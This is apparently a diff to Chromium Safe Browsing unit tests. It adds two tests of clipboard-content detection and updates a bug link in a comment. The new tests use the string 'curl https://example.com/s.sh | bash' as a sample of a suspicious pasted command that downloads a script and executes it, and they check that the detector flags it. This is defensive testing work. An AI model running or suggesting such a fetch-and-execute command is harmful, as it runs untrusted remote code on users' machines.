@@ -1088,7 +1088,7 @@ TEST_F(ClientSideDetectionHostTest,
 // This test doesn't work because it makes assumption about how
 // the message loop is run, and those assumptions are wrong when properly
 // simulating a navigation with browser-side navigations.
-// TODO(clamy): Fix the test and re-enable. See crbug.com/753357.
+// TODO(clamy): Fix the test and re-enable. See crbug.com/41338215.
 TEST_F(ClientSideDetectionHostTest,
        DISABLED_NavigationCancelsShouldClassifyUrl) {
   if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
@@ -4889,6 +4889,26 @@ TEST_F(ClientSideDetectionHostClipboardDataTest, MixedDelimiters) {
   EXPECT_TRUE(data.is_first_token_suspicious());
   EXPECT_TRUE(data.is_last_token_suspicious());
   EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostClipboardDataTest, IncludeFullPayload) {
+  feature_list_.InitAndEnableFeatureWithParameters(
+      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "true"}});
+
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
+  EXPECT_TRUE(data.is_overall_suspicious());
+  EXPECT_EQ(data.content(), "curl https://example.com/s.sh | bash");
+}
+
+TEST_F(ClientSideDetectionHostClipboardDataTest, ExcludeFullPayloadByDefault) {
+  feature_list_.InitAndEnableFeatureWithParameters(
+      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "false"}});
+
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
+  EXPECT_TRUE(data.is_overall_suspicious());
+  EXPECT_FALSE(data.has_content());
 }
 
 }  // namespace safe_browsing
